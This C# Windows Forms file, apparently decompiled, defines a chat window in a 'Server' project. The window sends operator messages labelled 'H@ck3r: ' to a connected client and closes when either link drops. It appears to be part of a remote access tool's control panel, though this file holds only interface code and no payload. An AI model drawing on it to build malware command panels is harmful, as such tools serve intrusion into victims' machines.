using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormChat : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	public RichTextBox richTextBox1;

	public RJTextBox rjTextBox1;

	public FormChat()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		rjTextBox1.textBox1.KeyDown += _KeyClick;
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		richTextBox1.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void _KeyClick(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return && !string.IsNullOrEmpty(rjTextBox1.textBox1.Text))
		{
			client.Send(new object[2]
			{
				"Message",
				"H@ck3r: " + rjTextBox1.textBox1.Text + "\n"
			});
			RichTextBox richTextBox = richTextBox1;
			richTextBox.Text = richTextBox.Text + "H@ck3r: " + rjTextBox1.textBox1.Text + "\n";
			richTextBox1.SelectionStart = richTextBox1.Text.Length;
			richTextBox1.ScrollToCaret();
			rjTextBox1.textBox1.Text = "";
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.richTextBox1.BackColor = System.Drawing.Color.White;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Enabled = false;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBox1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.richTextBox1.Location = new System.Drawing.Point(3, 64);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(484, 437);
		this.richTextBox1.TabIndex = 15;
		this.richTextBox1.Text = "";
		this.rjTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.rjTextBox1.Enabled = false;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox1.Location = new System.Drawing.Point(3, 501);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "";
		this.rjTextBox1.Size = new System.Drawing.Size(484, 31);
		this.rjTextBox1.TabIndex = 16;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(490, 535);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.rjTextBox1);
		base.Name = "FormChat";
		this.Text = "Chat";
		base.Load += new System.EventHandler(FormProcess_Load);
		base.ResumeLayout(false);
	}
}
